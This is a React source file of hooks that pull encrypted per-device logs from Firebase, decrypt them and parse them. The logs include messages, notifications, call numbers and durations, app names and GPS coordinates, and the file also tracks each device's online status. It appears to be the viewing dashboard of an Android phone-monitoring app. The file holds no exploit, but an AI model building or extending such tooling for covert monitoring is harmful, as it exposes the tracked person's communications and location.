import { useState, useEffect, useCallback } from 'react';
import { ref, onValue, query, limitToLast, onChildAdded } from 'firebase/database';
import { db } from '../firebase/firebaseConfig';
import { decryptData } from '../utils/decryptData';

/**
 * Helper to decrypt specific target fields dynamically inside Firebase JSON objects
 */
async function decryptPayloads(val) {
  if (typeof val !== 'object' || val === null) return val;
  const processed = { ...val };
  
  // Comprehensive target list based on Firebase DB screenshot
  const TGT_FIELDS = [
    'content', 'text', 'message', 'bigText', 'coords', 
    'number_or_name', 'number', 'name', 'appName', 'title', 
    'app', 'duration'
  ];
  
  // Recursively process or scan fields
  for (const field of TGT_FIELDS) {
    if (typeof processed[field] === 'string' && processed[field].length > 10) {
      const fieldVal = processed[field].trim();
      // Heuristic check for Base64 (ignoring very short strings)
      if (/^[A-Za-z0-9+/=]+$/.test(fieldVal)) {
        try {
          const decrypted = await decryptData(fieldVal);
          if (decrypted && decrypted !== '[Decryption Failed]') {
            processed[field] = decrypted;
          }
        } catch (e) {
          console.error(`Decryption error for field ${field}:`, e);
        }
      }
    }
  }

  // Explicit mapping for common Android-side specific names
  if (processed.number_or_name && !processed.number) processed.number = processed.number_or_name;
  if (processed.app && !processed.appName) processed.appName = processed.app;

  // Handle nested objects like deviceInfo, locationInfo, etc.
  for (const key of Object.keys(processed)) {
     if (key !== 'id' && typeof processed[key] === 'object' && processed[key] !== null) {
       processed[key] = await decryptPayloads(processed[key]);
     }
  }

  // Parse location coordinate JSON manually if targeting GPS array structure
  if (processed.coords && typeof processed.coords === 'string') {
    if (processed.coords.includes('{')) {
      try {
        const parsedCoords = JSON.parse(processed.coords);
        processed.latitude = parsedCoords.latitude || processed.latitude;
        processed.longitude = parsedCoords.longitude || processed.longitude;
      } catch(e) {}
    } else if (processed.coords.includes(',')) {
      const pts = processed.coords.split(',');
      if (pts.length >= 2) {
        processed.latitude = parseFloat(pts[0]);
        processed.longitude = parseFloat(pts[1]);
      }
    }
  }

  return processed;
}

export const useDecryptedFirebase = (deviceId, path, options = {}) => {
  const { mode = 'list', limit = 100 } = options;
  const [data, setData] = useState(mode === 'list' ? [] : null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    if (!deviceId) {
      setData(mode === 'list' ? [] : null);
      setLoading(false);
      return;
    }

    setData(mode === 'list' ? [] : null);
    setError(null);
    setLoading(true);

    const dbRef = ref(db, `logs/${deviceId}/${path}`);

    try {
      if (mode === 'single') {
        const unsub = onValue(dbRef, async (snapshot) => {
          const val = snapshot.val();
          if (!val) {
            setData(null);
            setLoading(false);
            return;
          }
          
          if (typeof val === 'object') {
             const keys = Object.keys(val).sort();
             if (keys.length > 0) {
               const latestKey = keys[keys.length - 1];
               const latestVal = val[latestKey];
               const processed = await decryptPayloads(latestVal);
               setData(processed);
             } else {
               setData(null);
             }
          } else {
             setData(null);
          }
          setLoading(false);
        }, (err) => {
          setError(err.message);
          setLoading(false);
        });

        return () => unsub();
      }

      // List mode via onValue for full sync (handles deletions)
      const q = query(dbRef, limitToLast(limit));
      
      const unsub = onValue(q, async (snapshot) => {
        const val = snapshot.val();
        if (!val) {
          setData([]);
          setLoading(false);
          return;
        }

        // snapshot.val() returns an object with random keys, 
        // we need to process each child and maintain order
        const items = [];
        const entries = Object.entries(val);
        
        // Sort entries by key (Firebase keys are chronological) in reverse
        entries.sort((a, b) => b[0].localeCompare(a[0]));

        for (const [key, itemVal] of entries) {
          const processed = await decryptPayloads(itemVal);
          items.push({ id: key, ...processed });
        }
        
        setData(items);
        setLoading(false);
      }, (err) => {
        setError(err.message);
        setLoading(false);
      });

      return () => unsub();
    } catch (e) {
      setError(e.message);
      setLoading(false);
    }
  }, [deviceId, path, mode, limit]);

  return { data, loading, error };
};

export const useDeviceStatus = (deviceId) => {
  const [status, setStatus] = useState('offline');
  const [lastPing, setLastPing] = useState(null);

  useEffect(() => {
    if (!deviceId) return;

    const statusRef = ref(db, `devices/${deviceId}/status`);
    const pingRef = ref(db, `devices/${deviceId}/lastPing`);

    const unsubStatus = onValue(statusRef, (snap) => {
      const val = snap.val();
      setStatus(val === 'online' || val === true ? 'online' : 'offline');
    });

    const unsubPing = onValue(pingRef, (snap) => {
      setLastPing(snap.val());
    });

    return () => {
      unsubStatus();
      unsubPing();
    };
  }, [deviceId]);

  return { status, lastPing };
};
